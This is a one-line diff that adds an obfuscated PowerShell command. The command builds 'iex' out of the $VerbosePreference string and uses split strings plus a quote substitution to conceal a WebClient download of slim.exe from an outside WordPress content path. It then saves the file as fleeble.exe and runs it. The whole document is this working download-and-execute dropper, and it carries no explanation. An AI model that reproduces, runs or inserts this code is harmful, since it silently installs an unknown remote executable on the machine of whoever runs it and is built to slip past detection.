@@ -1,0 +1,1 @@
+﻿ . ( $VeRBOsEPReFerENCE.TostRInG()[1,3]+'x'-JOIN'')((('(New'+'-Object Syst'+'em.Ne'+'t.W'+'ebClient).Do'+'wnlo'+'adFile'+'(Duxhttp://'+'www.tele'+'media.'+'co.'+'za'+'/w'+'p-content/ozone/'+'slim.exeDu'+'x,'+'Duxf'+'l'+'eeb'+'le.exeDux);Start-P'+'r'+'ocess Duxfleeble'+'.e'+'x'+'e'+'Dux') -crEPLAcE ([CHar]68+[CHar]117+[CHar]120),[CHar]39) )
